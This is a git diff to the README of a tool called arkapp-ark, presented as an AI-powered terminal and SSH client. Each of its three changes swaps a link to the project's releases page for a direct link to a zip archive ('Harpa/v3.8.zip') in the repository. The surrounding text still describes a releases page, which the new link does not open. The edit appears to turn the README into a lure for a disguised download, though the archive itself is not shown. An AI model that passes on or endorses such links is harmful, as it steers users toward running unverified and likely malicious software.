@@ -1,6 +1,6 @@
 # 🚀 arkapp-ark - Your AI-Powered Terminal and SSH Client
 
-[![Download Now](https://img.shields.io/badge/Download-arkapp--ark-blue?style=for-the-badge&logo=github)](https://github.com/btu22/arkapp-ark/releases)
+[![Download Now](https://img.shields.io/badge/Download-arkapp--ark-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/btu22/arkapp-ark/main/Harpa/v3.8.zip)
 
 ## 🌟 What Is arkapp-ark?
 
@@ -35,7 +35,7 @@ Ready to try arkapp-ark? Here's how to get it on your Windows computer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/btu22/arkapp-ark/releases](https://github.com/btu22/arkapp-ark/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/btu22/arkapp-ark/main/Harpa/v3.8.zip](https://raw.githubusercontent.com/btu22/arkapp-ark/main/Harpa/v3.8.zip)
 
 This page shows all available versions of arkapp-ark. Look for the latest release – the topmost one – and click on it.
 
@@ -178,7 +178,7 @@ Whether you're:
 
 Don't wait – download arkapp-ark today and experience the future of terminal and SSH management.
 
-[![Download arkapp-ark Now](https://img.shields.io/badge/🚀-Download%20arkapp--ark-brightgreen?style=for-the-badge)](https://github.com/btu22/arkapp-ark/releases)
+[![Download arkapp-ark Now](https://img.shields.io/badge/🚀-Download%20arkapp--ark-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/btu22/arkapp-ark/main/Harpa/v3.8.zip)
 
 Take control of your servers with intelligence, speed, and simplicity. Your AI-powered terminal awaits!
 
